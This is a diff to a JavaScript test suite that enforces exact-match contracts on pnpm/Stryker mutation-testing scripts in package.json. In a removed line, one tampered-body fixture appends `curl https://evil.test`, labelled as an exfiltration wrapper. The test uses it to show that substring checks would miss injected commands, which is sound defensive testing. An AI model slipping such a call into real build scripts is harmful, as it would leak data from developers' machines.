@@ -30,6 +30,22 @@ function aggregateScript() {
 }
 
 /**
+ * Assert a script body is EXACTLY its canonical contract command. Exact equality
+ * is the contract: a body that merely contains `expected` (a wrapper, echo,
+ * extra flag, or duplicated invocation) must fail. Every per-package, dry-run,
+ * and aggregate check — and the regression test that proves this rejects
+ * tampering — routes through this single helper so they can never drift.
+ *
+ * @param {string | undefined} body - the actual script body from package.json.
+ * @param {string} expected - the canonical command the script must be.
+ * @param {string} message - failure description.
+ * @throws {assert.AssertionError} when `body` is not exactly `expected`.
+ */
+function assertExactScript(body, expected, message) {
+  assert.equal(body, expected, message);
+}
+
+/**
  * Load the root package.json scripts block.
  *
  * @returns {Promise<Record<string, string>>} the `scripts` object.
@@ -78,7 +94,7 @@ test('no test:mutate:* root script carries a trailing `--`', async () => {
 for (const { pkg, filter } of perPackage) {
   test(`test:mutate:${pkg} is exactly \`pnpm --filter ${filter} exec stryker run\``, async () => {
     const scripts = await rootScripts();
-    assert.equal(
+    assertExactScript(
       scripts[`test:mutate:${pkg}`],
       scopedStrykerRun(filter),
       `test:mutate:${pkg} must be exactly \`pnpm --filter ${filter} exec stryker run\` — no wrapper, echo, or nested \`--filter … <script>\` delegation that mangles forwarded scoping args`,
@@ -93,7 +109,7 @@ for (const { pkg, filter } of perPackage) {
 // so the `--dryRunOnly` flag can never regress to a foot-gun-prone delegation.
 test('test:mutate:cli:dry is exactly `pnpm --filter @rundown-org/cli exec stryker run --dryRunOnly`', async () => {
   const scripts = await rootScripts();
-  assert.equal(
+  assertExactScript(
     scripts['test:mutate:cli:dry'],
     scopedStrykerRun('@rundown-org/cli', ' --dryRunOnly'),
     'test:mutate:cli:dry must be exactly `pnpm --filter @rundown-org/cli exec stryker run --dryRunOnly` — the base scoped-exec shape plus the --dryRunOnly contract flag, no wrapper or nested delegation',
@@ -106,35 +122,54 @@ test('test:mutate:cli:dry is exactly `pnpm --filter @rundown-org/cli exec stryke
 // drops the canonical `run-s` runner.
 test('test:mutate aggregate is exactly `run-s` over every per-package script', async () => {
   const scripts = await rootScripts();
-  assert.equal(
+  assertExactScript(
     scripts['test:mutate'],
     aggregateScript(),
     'test:mutate must be exactly the canonical `run-s test:mutate:parser test:mutate:core test:mutate:cli test:mutate:plugin` fan-out',
   );
 });
 
-// Regression pin (issue #551 review): the assertions above use exact-string
-// comparison, not a substring/regex match. This proves that choice has teeth —
-// each tampered body embeds the canonical command (so the old `.includes()` /
-// `assert.match()` checks would have PASSED it) yet must be rejected.
-test('exact-shape assertions reject wrappers a substring match would accept', () => {
+// Regression pin (issue #551 review): the production checks above use exact-string
+// comparison via `assertExactScript`, not a substring/regex match. This routes
+// canonical and tampered bodies through that SAME helper to prove the choice has
+// teeth — each tampered body embeds the canonical command (so the old
+// `.includes()` / `assert.match()` checks would have PASSED it), yet must fail.
+// Exercising the shared helper means loosening it can never silently pass here.
+test('assertExactScript rejects wrappers a substring match would accept', () => {
   const canonical = scopedStrykerRun('@rundown-org/cli');
-  const wrapped = [
+  const tampered = [
     `echo building && ${canonical}`, // prefix wrapper
-    `${canonical} && curl https://evil.test`, // suffix wrapper / exfil
+    `${canonical} && another-command`, // suffix wrapper
     `${canonical} --dryRunOnly`, // extra flag outside the base contract
     `${canonical} && ${canonical}`, // duplicated invocation
+    `echo "${canonical}"`, // echoed, not executed
   ];
-  for (const body of wrapped) {
-    // Precondition: a substring/regex check (the old approach) would ACCEPT it…
+
+  // A canonical body passes the shared helper the production checks use.
+  assert.doesNotThrow(() => {
+    assertExactScript(canonical, canonical, 'canonical body must pass');
+  }, 'canonical body must pass the shared exact-match helper');
+
+  // Every tampered body contains the canonical command (so a substring/regex
+  // check would accept it) yet must fail the shared helper.
+  for (const body of tampered) {
     assert.ok(body.includes(canonical), `precondition: ${body} contains the canonical command`);
-    // …but the exact-equality contract the tests now use REJECTS it.
-    assert.notEqual(body, canonical, `exact match must reject wrapped body: ${body}`);
+    assert.throws(
+      () => {
+        assertExactScript(body, canonical, 'tampered body must fail');
+      },
+      assert.AssertionError,
+      `assertExactScript must reject tampered body: ${body}`,
+    );
   }
 
-  // Same tightening for the aggregate: a mere echo mentioning the sub-scripts
-  // must not pass the exact `run-s …` contract.
+  // The same helper guards the aggregate against a mere echo mention.
   const aggregate = aggregateScript();
-  assert.ok(`echo "${aggregate}"`.includes(aggregate), 'precondition: echo mentions the aggregate');
-  assert.notEqual(`echo "${aggregate}"`, aggregate);
+  assert.throws(
+    () => {
+      assertExactScript(`echo "${aggregate}"`, aggregate, 'echoed aggregate must fail');
+    },
+    assert.AssertionError,
+    'assertExactScript must reject an echoed aggregate mention',
+  );
 });
